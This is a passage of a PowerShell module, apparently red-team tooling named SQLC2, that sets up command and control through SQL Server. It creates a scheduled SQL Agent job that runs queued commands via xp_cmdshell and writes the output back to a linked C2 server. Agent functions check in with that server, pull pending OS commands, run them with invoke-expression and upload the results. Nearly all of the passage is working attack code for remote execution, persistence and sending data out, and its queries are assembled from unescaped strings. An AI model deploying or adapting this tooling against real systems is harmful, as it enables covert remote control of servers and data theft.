                    WHILE (SELECT count(*) FROM @output) > 0 
                    BEGIN
	
	                    -- Setup variables
	                    DECLARE @CurrentCid varchar (8000) -- current cid
	                    DECLARE @CurrentCmd varchar (8000) -- current command
	                    DECLARE @xpoutput TABLE ([rid] int IDENTITY(1,1) PRIMARY KEY,result varchar(max)) -- xp_cmdshell output table
	                    DECLARE @result varchar(8000) -- xp_cmdshell output value

	                    -- Get first command in the list - need to add cid
	                    SELECT @CurrentCid = (SELECT TOP 1 cid FROM @output)
	                    SELECT @CurrentCid as cid
	                    SELECT @CurrentCmd = (SELECT TOP 1 command FROM @output)
	                    SELECT @CurrentCmd as command
		
	                    -- Run the command - not command output break when multiline - need fix, and add cid
	                    INSERT @xpoutput (result) exec master..xp_cmdshell @CurrentCmd
	                    SET @result = (select top 1 result from  @xpoutput)
	                    select @result as result

	                    -- Upload results to C2 SQL Server - need to add cid
	                    Update [$RandomLink].database1.dbo.C2Commands set result = @result, status=''success''
	                    WHERE servername like @@SERVERNAME and cid like @CurrentCid

	                    -- Clear the command result history
	                    DELETE FROM @xpoutput 

	                    -- Remove first command
	                    DELETE TOP (1) FROM @output 
                    END', 
		            @database_name=N'master', 
		            @flags=0
            IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
            EXEC @ReturnCode = msdb.dbo.sp_update_job @job_id = @jobId, @start_step_id = 1
            IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
            EXEC @ReturnCode = msdb.dbo.sp_add_jobschedule @job_id=@jobId, @name=N'SQLC2 Agent Schedule', 
		            @enabled=1, 
		            @freq_type=4, 
		            @freq_interval=1, 
		            @freq_subday_type=4, 
		            @freq_subday_interval=1, 
		            @freq_relative_interval=0, 
		            @freq_recurrence_factor=0, 
		            @active_start_date=20180521, 
		            @active_end_date=99991231, 
		            @active_start_time=0, 
		            @active_end_time=235959, 
		            @schedule_uid=N'9eb66fdb-70d6-4ccf-8b60-a97431487e88'
            IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
            EXEC @ReturnCode = msdb.dbo.sp_add_jobserver @job_id = @jobId, @server_name = N'(local)'
            IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
            COMMIT TRANSACTION
            GOTO EndSave
            QuitWithRollback:
                IF (@@TRANCOUNT > 0) ROLLBACK TRANSACTION
            EndSave:
            
            -- Script: Get-AgentJob.sql
            -- Description: Return a list of agent jobs.
            -- Reference: https://msdn.microsoft.com/en-us/library/ms189817.aspx

            SELECT 	SUSER_SNAME(owner_sid) as [JOB_OWNER], 
	            job.job_id as [JOB_ID],
	            name as [JOB_NAME],
	            description as [JOB_DESCRIPTION],
	            step_name,
	            command,
	            enabled,
	            server,
	            database_name,
	            date_created
            FROM [msdb].[dbo].[sysjobs] job
            INNER JOIN [msdb].[dbo].[sysjobsteps] steps        
	            ON job.job_id = steps.job_id
            WHERE name like 'SQLC2 Agent Job'
            ORDER BY JOB_OWNER,JOB_NAME"
        
        # Run Query
        $TblResults = Get-C2SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database 'msdb' -SuppressVerbose -TimeOut 300

        # Verify job was added
        if(($TblResults | Measure-Object | select count -ExpandProperty count) -eq 1)
        {
            Write-Verbose "$instance : Confirmed the job named 'SQLC2 Agent Job' was added."
        }else{
            Write-Verbose "$instance : The agent job could not be created or already exists."
            Write-Verbose "$instance : You will have to remove the SQL Server link 'SQLC2Server."
            return
        }      

        Write-Verbose "$instance : Done."
    }

    End
    {
        # Return data
        # $TblResults
    }
}


# ----------------------------------
#  Register-SQLC2Agent
# ----------------------------------
# Author: Scott Sutherland
Function Register-SQLC2Agent 
{
    <#
            .SYNOPSIS
            This command should be run on the c2 agent system so it can send a keep alive to the server. 
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DatabaseName
            Database name that contains target table.
            .PARAMETER Table
            Table name to that contains target column.
            .PARAMETER Column
            Column that contains the TSQL command to run.
            .EXAMPLE
            PS C:\> Register-SQLC2Agent -Instance "SQLServer1\STANDARDDEV2014" -Database database1
            PS C:\> Register-SQLC2Agent -Username CloudAdmin -Password 'CloudPassword!' -Instance cloudserver1.database.windows.net -Database database1
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database containing target C2 table.')]
        [string]$Database,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Create data tables for output
        $TblResults = New-Object -TypeName System.Data.DataTable
        $TblDatabases = New-Object -TypeName System.Data.DataTable
        $null = $TblDatabases.Columns.Add('ServerName')
        $null = $TblDatabases.Columns.Add('Command')
        $null = $TblDatabases.Columns.Add('Status')
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-C2ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SC2QLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }        

        # Setup query to grab commands
        $Query = "
             -- checkin as agent
            IF not Exists (SELECT * FROM dbo.C2Agents WHERE servername = '$env:COMPUTERNAME')
	            INSERT dbo.C2Agents (servername,agentype) VALUES ('$env:COMPUTERNAME','PsProcess')
            ELSE
	        UPDATE dbo.C2Agents SET lastcheckin = (select GETDATE ())
            WHERE servername like '$env:COMPUTERNAME'"

        # Execute Query
        $TblResults = Get-C2SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose

        Write-Verbose "$instance : $env:COMPUTERNAME agent registered/checked in."
    }

    End
    {
        # Return data
        $TblResults        
    }
}


# ----------------------------------
#  Get-SQLC2Agent
# ----------------------------------
# Author: Scott Sutherland
Function Get-SQLC2Agent 
{
    <#
            .SYNOPSIS
            This command should be run against the C2 SQLserver and will return a list of agents. 
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DatabaseName
            Database name that contains target table.
            .PARAMETER Table
            Table name to that contains target column.
            .PARAMETER Column
            Column that contains the TSQL command to run.
            .EXAMPLE
            PS C:\> Get-SQLC2Agent-Instance "SQLServer1\STANDARDDEV2014" -Database database1
            PS C:\> Get-SQLC2Agent -Username CloudAdmin -Password 'CloudPassword!' -Instance cloudserver1.database.windows.net -Database database1
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database containing target C2 table.')]
        [string]$Database,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Create data tables for output
        $TblResults = New-Object -TypeName System.Data.DataTable
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-C2ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SC2QLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }        

        # Setup query to grab commands
        $Query = "SELECT * FROM dbo.c2agents"

        # Execute Query
        $TblResults = Get-C2SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose        
        $AgentCount = $TblResults | measure | select count -ExpandProperty count

        Write-Verbose -Message "$Instance : $AgentCount agents were found registered."
    }

    End
    {
        # Return data
        $TblResults        
    }
}


# ----------------------------------
#  Set-SQLC2Command
# ----------------------------------
# Author: Scott Sutherland
Function Set-SQLC2Command
{
    <#
            .SYNOPSIS
            This functions stores a command in the C2COMMAND table of the C2 SQL Server. 
            This command should be run against the C2 SQL Server.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DatabaseName
            Database name that contains target table.
            .PARAMETER ServerName
            ServerName to run the command on. By default it is all nodes.
            .PARAMETER Command
            Command to run on the agent.
            .EXAMPLE
            PS C:\> Set-SQLC2Command -Instance "SQLServer1\STANDARDDEV2014" -Database database1 -Command 'whoami' -ServerName host1
            PS C:\> Set-SQLC2Command -Username CloudAdmin -Password 'CloudPassword!' -Instance cloudserver1.database.windows.net -Database database1 -Command 'whoami' -ServerName host1
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database containing target C2 table.')]
        [string]$Database,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'ServerName of the agent.')]
        [string]$ServerName,

       [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Command to run on the agent.')]
        [string]$Command,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Create data tables for output
        $TblResults = New-Object -TypeName System.Data.DataTable
        $TblDatabases = New-Object -TypeName System.Data.DataTable
        $null = $TblDatabases.Columns.Add('ServerName')
        $null = $TblDatabases.Columns.Add('Command')
        $null = $TblDatabases.Columns.Add('Status')
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-C2ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SC2QLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }

        # Setup agent node filtering based on servername
        If(-not $ServerName){
            $ServerName = "All"
        }

        # Test connection
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose "$instance : Attempting to set command on C2 Server $Instance for $ServerName agent(s)."
                Write-Verbose "$instance : Command: $Command"
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }        

        # Set command for single agent
        $Query = "INSERT dbo.C2COMMANDS (ServerName,Command,Status) VALUES ('$ServerName','$Command','pending')"

        # Execute Query
        $TblResults = Get-C2SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose

        Write-Verbose "$instance : Command added for $ServerName agent(s) on C2 server $Instance."
    }

    End
    {
        # Return data
        $TblResults
    }
}


# ----------------------------------
#  Get-SQLC2Command
# ----------------------------------
# Author: Scott Sutherland
Function Get-SQLC2Command
{
    <#
            .SYNOPSIS
            This command gets a command from a table on a remote c2 SQL Server. 
            This command should be run on the c2 agent system so it can pull down 
            any commands the C2 server has for it to execute.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DatabaseName
            Database name that contains target table.      
            .PARAMETER Execute
            Run all of the commands downloaded from the C2 server on the agent system.                                 
            .EXAMPLE
            PS C:\> Get-SQLC2Command -Instance "SQLServer1\STANDARDDEV2014" -Database database1
            .EXAMPLE
            PS C:\> Get-SQLC2Command -Instance "SQLServer1\STANDARDDEV2014" -Database database1 -Execute
            .EXAMPLE
            PS C:\> Get-SQLC2Command -Username CloudAdmin -Password 'CloudPassword!' -Instance cloudserver1.database.windows.net -Database database1
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database containing target C2 table.')]
        [string]$Database,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Execute commands from c2.')]
        [switch]$Execute,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Create data tables for output
        $TblResults = New-Object -TypeName System.Data.DataTable
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-C2ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SC2QLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose "$instance : Attempting to grab command from $Instance."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }     
        
        # Check in the server
        Register-SQLC2Agent -Username $Username -Password $Password -Instance $Instance -Database $Database -SuppressVerbose | Out-Null

        # Setup query to grab commands        
        $Query = "SELECT * FROM dbo.c2commands where status like 'pending' and (servername like '$env:COMPUTERNAME' or servername like 'All')"

        # Execute Query
        $TblResults = Get-C2SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose 

        # check command count
        $CommandCount = $TblResults | measure | select count -ExpandProperty count

        Write-Verbose "$instance : $CommandCount commands were from $Instance."
    }

    End
    {
        # Process command execution
        if($Execute){
            
            # Loop through pending commands
            $TblResults | ForEach-Object {

               # Grab command
               $C2CommandId = $_.cid
               $C2Command = $_.command
               
               # Execute command                             
               Invoke-SQLC2Command -Username $Username -Password $Password -Instance $Instance -Database $Database -Verbose -Command $C2Command -Cid $C2CommandId
            }
        }else{

             # Return data
            $TblResults
        }
    }
 }


# ----------------------------------
#  Invoke-SQLC2Command
# ----------------------------------
# Author: Scott Sutherland
Function Invoke-SQLC2Command
{
    <#
            .SYNOPSIS
            This command should be run on the agent system.  It will execute a OS command locally and 
            return the results to the C2 SQL Server.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DatabaseName
            Database name that contains target table.
            .PARAMETER Command
            The OS command to run.
            .EXAMPLE
            PS C:\> Invoke-SQLC2Command -Instance "SQLServer1\STANDARDDEV2014" -Database database1
            PS C:\> Invoke-SQLC2Command -Username CloudAdmin -Password 'CloudPassword!' -Instance cloudserver1.database.windows.net -Database database1
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database containing target C2 table.')]
        [string]$Database,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'The OS command to run.')]
        [string]$Command,

        [Parameter(Mandatory = $true,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'This is the unique command id provide from the server.')]
        [Int]$Cid,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Create data tables for output
        $TblResults = New-Object -TypeName System.Data.DataTable
    }

    Process
    {
        Write-Verbose "Running command $Cid on $env:COMPUTERNAME"
        Write-Verbose "Command: $Command"

        # Run the command
        try{
            $CommandResults = invoke-expression "$Command" 
            Write-Verbose "Command complete." 
            $CommandStatus = "success"
        }catch{
            Write-Verbose "Command failed. Aborting." 
            $CommandStatus = "failed"
        }                         

        # Parse computer name from the instance
        $ComputerName = Get-C2ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SC2QLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }     
        
        # Check in the server
        Register-SQLC2Agent -Username $Username -Password $Password -Instance $Instance -Database $Database -SuppressVerbose | Out-Null

        # Setup query to grab commands      
        Write-Verbose -Message "$Instance : Send command results to $Instance for command $Cid."  
        $Query = "
             -- update command request from server            
	        UPDATE dbo.C2COMMANDS SET lastupdate = (select GETDATE ()),result = '$CommandResults',status='$CommandStatus',command='$Command'
            WHERE CID like $Cid"

        # Execute Query
        $TblResults = Get-C2SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose 

        # check command count
        $CommandCount = $TblResults.row.count 

        Write-Verbose "$instance : Update sent."        
    }

    End
    {
        # Return data
        $TblResults
    }
 }


# ----------------------------------
#  Get-SQLC2Result
# ----------------------------------
# Author: Scott Sutherland
Function Get-SQLC2Result
{
    <#
            .SYNOPSIS
            This function gets command results from the C2 SQL Server. 
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DatabaseName
            Database name that contains target table.    
            .PARAMETER ServerName
            Filter by server name.     
            .PARAMETER Cid
            Filter by command id.     
            .PARAMETER Status
            Filter by status.                                                
            .EXAMPLE
            PS C:\> Get-SQLC2Result -Instance "SQLServer1\STANDARDDEV2014" -Database database1
            PS C:\> Get-SQLC2Result -Instance "SQLServer1\STANDARDDEV2014" -Database database1 -Cid 1
            PS C:\> Get-SQLC2Result -Instance "SQLServer1\STANDARDDEV2014" -Database database1 -Status "Success"
            PS C:\> Get-SQLC2Result -Instance "SQLServer1\STANDARDDEV2014" -Database database1 -ServerName "Server1"
            PS C:\> Get-SQLC2Result -Username CloudAdmin -Password 'CloudPassword!' -Instance cloudserver1.database.windows.net -Database database1
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database containing target C2 table.')]
        [string]$Database,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter by server name.')]
        [string]$ServerName,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter by Status.')]
        [ValidateSet("pending","success","failed")]
        [string]$Status,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter by command ID.')]
        [string]$Cid,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Create data tables for output
        $TblResults = New-Object -TypeName System.Data.DataTable

        # Create ServerName filter
        if($ServerName){
            $FilterServerName = "WHERE servername like '$ServerName'"
        }else{
            $FilterServerName = ""
        }
            
        # Create Status filter
        if($Status){
            $FilterStatus = "WHERE status like '$Status'"
        }else{
            $FilterStatus = ""
        }
            

        # Create ServerName filter
        if($Cid){
            $FilterCid = "WHERE cid like '$Cid'"
        }else{
            $FilterCid = ""
        }
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-C2ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SC2QLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose "$instance : Attempting to grab command from $env:COMPUTERNAME ."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }     
                
        # Setup query to grab commands        
        $Query = "
            SELECT * FROM dbo.c2commands 
            $FilterServerName
            $FilterStatus
            $FilterCid
            "
            $Query
        # Execute Query
        $TblResults = Get-C2SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose 

        # check command count
        $CommandCount = $TblResults.row.count 

        Write-Verbose "$instance : $CommandCount commands were from $env:COMPUTERNAME."
    }

    End
    {
        # Return data
        $TblResults
    }
 }


# ----------------------------------
#  Remove-SQLC2Command
# ----------------------------------
# Author: Scott Sutherland
Function Remove-SQLC2Command
{
    <#
            .SYNOPSIS
            This command clears the command history on the remote c2 SQL Server. 
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER DatabaseName
            Database name that contains target table.     
            .PARAMETER ServerName
            Server name to clear command history for.                               
            .EXAMPLE
            PS C:\> Remove-SQLC2Command -Instance "SQLServer1\STANDARDDEV2014" -Database database1
            .EXAMPLE
            PS C:\> Remove-SQLC2Command -Instance "SQLServer1\STANDARDDEV2014" -Database database1 -ServerName Server1
            .EXAMPLE
            PS C:\> Remove-SQLC2Command -Username CloudAdmin -Password 'CloudPassword!' -Instance cloudserver1.database.windows.net -Database database1
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database containing target C2 table.')]
        [string]$Database,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Server to clear command history for.')]
        [string]$ServerName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Create data tables for output
        $TblResults = New-Object -TypeName System.Data.DataTable

        if($ServerName){
            $ServerFilter = "WHERE servername like '$ServerName'"
        }else{
            $ServerFilter = ""
        }
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-C2ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SC2QLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose "$instance : Attempting to clear command history from $Instance."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }     
        
        # Setup query to grab commands        
        $Query = "DELETE FROM dbo.C2COMMANDS 
                  $ServerFilter"

        # Execute Query
        $TblResults = Get-C2SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose 
    }

    End
    {
        Write-Verbose "$instance : Done."
    }
 }


# ----------------------------------
#  Remove-SQLC2Agent
# ----------------------------------
# Author: Scott Sutherland
Function Remove-SQLC2Agent
{
    <#
            .SYNOPSIS
            This command clears the agents registered on the remote c2 SQL Server. 
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DatabaseName
            Database name that contains target table.     
            .PARAMETER ServerName
            Server name to clear command history for.                               
            .EXAMPLE
            PS C:\> Remove-SQLC2Agent -Instance "SQLServer1\STANDARDDEV2014" -Database database1
            .EXAMPLE
            PS C:\> Remove-SQLC2Agent -Instance "SQLServer1\STANDARDDEV2014" -Database database1 -ServerName Server1
            .EXAMPLE
            PS C:\> Remove-SQLC2Agent -Username CloudAdmin -Password 'CloudPassword!' -Instance cloudserver1.database.windows.net -Database database1
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
